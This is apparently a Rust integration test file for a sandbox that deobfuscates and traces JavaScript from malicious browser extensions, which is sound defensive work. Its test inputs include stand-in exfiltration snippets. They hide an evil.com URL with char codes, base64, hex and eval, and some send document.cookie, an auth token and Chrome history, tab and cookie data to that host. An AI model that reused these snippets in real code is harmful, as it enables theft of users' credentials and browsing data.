//! Integration test for sandbox + LLM deobfuscation flow
//!
//! These tests verify the sandbox handles complex real-world scenarios:
//! - Multi-layer obfuscation
//! - Memory limits
//! - Network isolation

use extanalyzer::sandbox::execute_snippet;

/// Test that the sandbox correctly handles real-world obfuscation patterns
#[test]
fn test_real_world_obfuscation_pattern() {
    // This pattern is common in malicious extensions:
    // Build a URL from char codes, then fetch it
    let code = r#"
        var chars = [104,116,116,112,115,58,47,47,101,118,105,108,46,99,111,109];
        var url = String.fromCharCode.apply(null, chars);
        fetch(url, {
            method: 'POST',
            body: JSON.stringify({ cookies: 'stolen' })
        });
    "#;

    let result = execute_snippet(code, 2000);
    assert!(
        result.error.is_none(),
        "Unexpected error: {:?}",
        result.error
    );

    // Should decode the URL
    assert!(
        !result.decoded_strings.is_empty(),
        "Should have decoded strings"
    );
    let fromcharcode_decode = result
        .decoded_strings
        .iter()
        .find(|d| d.function == "String.fromCharCode" && d.output == "https://evil.com");
    assert!(
        fromcharcode_decode.is_some(),
        "Should decode to evil URL, got: {:?}",
        result.decoded_strings
    );

    // Should trace the fetch
    assert!(!result.api_calls.is_empty(), "Should have API calls");
    let fetch_call = result.api_calls.iter().find(|c| c.function == "fetch");
    assert!(fetch_call.is_some(), "Should have fetch call");
}

/// Test nested obfuscation (base64 inside char codes)
#[test]
fn test_nested_obfuscation() {
    // First layer: fromCharCode builds "aHR0cHM6Ly9ldmlsLmNvbQ=="
    // "aHR0cHM6Ly9ldmlsLmNvbQ==" as char codes:
    // a=97, H=72, R=82, 0=48, c=99, H=72, M=77, 6=54, L=76, y=121, 9=57, l=108,
    // d=100, m=109, l=108, s=115, L=76, m=109, N=78, v=118, b=98, Q=81, ==61,61
    let code = r#"
        // First layer: fromCharCode builds "aHR0cHM6Ly9ldmlsLmNvbQ=="
        var b64 = String.fromCharCode(97,72,82,48,99,72,77,54,76,121,57,108,100,109,108,115,76,109,78,118,98,81,61,61);
        // Second layer: atob decodes the base64
        var url = atob(b64);
        fetch(url);
    "#;

    let result = execute_snippet(code, 2000);
    assert!(
        result.error.is_none(),
        "Unexpected error: {:?}",
        result.error
    );

    // Should have both decodings
    assert!(
        result.decoded_strings.len() >= 2,
        "Should have multiple decodings, got: {:?}",
        result.decoded_strings
    );

    // Should have fromCharCode decode
    let fromcharcode_decode = result
        .decoded_strings
        .iter()
        .find(|d| d.function == "String.fromCharCode");
    assert!(
        fromcharcode_decode.is_some(),
        "Should have fromCharCode decode"
    );

    // Should ultimately reveal the URL via atob
    let atob_decode = result.decoded_strings.iter().find(|d| d.function == "atob");
    assert!(atob_decode.is_some(), "Should have atob decode");
    assert_eq!(
        atob_decode.unwrap().output,
        "https://evil.com",
        "atob should decode to the final URL"
    );
}

/// Test that sandbox doesn't allow actual network access
#[test]
fn test_network_isolation() {
    // Try to make a real network request
    let code = r#"
        var result = 'not_called';
        fetch('https://httpbin.org/get')
            .then(function(r) { return r.json(); })
            .then(function(d) { result = 'called'; });
        result;
    "#;

    let result = execute_snippet(code, 1000);

    // Fetch should be traced, not executed
    assert!(!result.api_calls.is_empty(), "Should trace fetch");
    let fetch_call = result.api_calls.iter().find(|c| c.function == "fetch");
    assert!(fetch_call.is_some(), "Should have fetch call traced");

    // The result should still be 'not_called' because fetch is mocked
    // and promises don't actually execute (since setTimeout is also mocked)
    assert_eq!(
        result.final_value,
        Some("not_called".to_string()),
        "Fetch should be mocked, not actually executed"
    );
}

/// Test memory limit protection
#[test]
fn test_memory_limit() {
    // Try to allocate huge amount of memory
    let code = r#"
        var arr = [];
        for (var i = 0; i < 100000000; i++) {
            arr.push(new Array(10000));
        }
    "#;

    let result = execute_snippet(code, 5000);

    // Should fail with memory or timeout error, not crash
    assert!(
        result.error.is_some(),
        "Should have error for memory exhaustion"
    );
}

/// Test timeout protection for CPU-bound operations
#[test]
fn test_timeout_protection() {
    // Infinite loop should be stopped by timeout
    let code = r#"
        while(true) {}
    "#;

    let result = execute_snippet(code, 100);

    assert!(result.error.is_some(), "Should have timeout error");
    let error = result.error.as_ref().unwrap();
    assert!(
        error.contains("Timeout") || error.contains("interrupted") || error.contains("Exception"),
        "Error should indicate timeout/interrupt, got: {}",
        error
    );
}

/// Test eval tracing (common obfuscation technique)
#[test]
fn test_eval_with_obfuscated_code() {
    // Build code via fromCharCode, then eval it
    let code = r#"
        // This builds: fetch('https://evil.com')
        var payload = String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,101,118,105,108,46,99,111,109,39,41);
        eval(payload);
    "#;

    let result = execute_snippet(code, 2000);
    assert!(
        result.error.is_none(),
        "Unexpected error: {:?}",
        result.error
    );

    // Should decode the payload
    let fromcharcode_decode = result
        .decoded_strings
        .iter()
        .find(|d| d.function == "String.fromCharCode");
    assert!(
        fromcharcode_decode.is_some(),
        "Should have fromCharCode decode"
    );
    assert_eq!(
        fromcharcode_decode.unwrap().output,
        "fetch('https://evil.com')"
    );

    // The eval should execute and trace the fetch
    let fetch_call = result.api_calls.iter().find(|c| c.function == "fetch");
    assert!(fetch_call.is_some(), "eval should have executed the fetch");
}

/// Test multiple API calls in sequence
#[test]
fn test_multiple_api_calls() {
    let code = r#"
        // Read cookies
        var cookies = document.cookie;

        // Read storage
        var stored = localStorage.getItem('auth_token');

        // Send to attacker
        fetch('https://evil.com/steal', {
            method: 'POST',
            body: JSON.stringify({ cookies: cookies, token: stored })
        });
    "#;

    let result = execute_snippet(code, 2000);
    assert!(
        result.error.is_none(),
        "Unexpected error: {:?}",
        result.error
    );

    // Should have all three types of API calls
    assert!(
        result
            .api_calls
            .iter()
            .any(|c| c.function == "document.cookie.get"),
        "Should trace cookie access"
    );
    assert!(
        result
            .api_calls
            .iter()
            .any(|c| c.function == "localStorage.getItem"),
        "Should trace localStorage access"
    );
    assert!(
        result.api_calls.iter().any(|c| c.function == "fetch"),
        "Should trace fetch"
    );
}

/// Test chrome extension API tracing
#[test]
fn test_chrome_extension_api_tracing() {
    // Note: Callbacks are not executed because the chrome mock returns undefined
    // So we test sequential calls instead
    let code = r#"
        // Common malicious extension pattern: steal browsing data
        chrome.history.search({ text: '', maxResults: 1000 });
        chrome.tabs.query({});
        chrome.cookies.getAll({ domain: '.example.com' });
        fetch('https://evil.com/collect', {
            method: 'POST',
            body: 'data'
        });
    "#;

    let result = execute_snippet(code, 2000);
    assert!(
        result.error.is_none(),
        "Unexpected error: {:?}",
        result.error
    );

    // Should trace chrome API calls
    assert!(
        result
            .api_calls
            .iter()
            .any(|c| c.function.contains("chrome.history")),
        "Should trace chrome.history"
    );
    assert!(
        result
            .api_calls
            .iter()
            .any(|c| c.function.contains("chrome.tabs")),
        "Should trace chrome.tabs"
    );
    assert!(
        result
            .api_calls
            .iter()
            .any(|c| c.function.contains("chrome.cookies")),
        "Should trace chrome.cookies"
    );
    assert!(
        result.api_calls.iter().any(|c| c.function == "fetch"),
        "Should trace fetch"
    );
}

/// Test hexadecimal string obfuscation
#[test]
fn test_hex_string_decoding() {
    // Some malware uses hex escape sequences
    let code = r#"
        var url = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x63\x6f\x6d";
        fetch(url);
    "#;

    let result = execute_snippet(code, 2000);
    assert!(
        result.error.is_none(),
        "Unexpected error: {:?}",
        result.error
    );

    // The fetch should receive the decoded URL
    let fetch_call = result.api_calls.iter().find(|c| c.function == "fetch");
    assert!(fetch_call.is_some(), "Should have fetch call");
    assert_eq!(
        fetch_call.unwrap().arguments[0],
        serde_json::json!("https://evil.com"),
        "Fetch should receive decoded hex URL"
    );
}

/// Test that exception in user code doesn't crash sandbox
#[test]
fn test_exception_handling() {
    let code = r#"
        // Do some tracing first
        fetch('https://example.com');

        // Then throw an error
        throw new Error('intentional error');
    "#;

    let result = execute_snippet(code, 2000);

    // Should have the error
    assert!(result.error.is_some(), "Should have error from throw");

    // But should still have the traced call from before the error
    let fetch_call = result.api_calls.iter().find(|c| c.function == "fetch");
    assert!(
        fetch_call.is_some(),
        "Should have fetch call traced before error"
    );
}
